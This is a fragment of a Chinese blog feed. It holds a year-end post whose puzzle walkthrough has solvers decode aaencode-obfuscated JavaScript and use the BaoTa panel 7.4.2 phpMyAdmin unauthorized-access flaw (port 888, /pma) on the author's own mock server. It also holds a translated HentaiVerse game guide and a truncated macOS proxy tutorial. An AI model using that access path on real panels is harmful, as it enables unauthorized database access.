data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 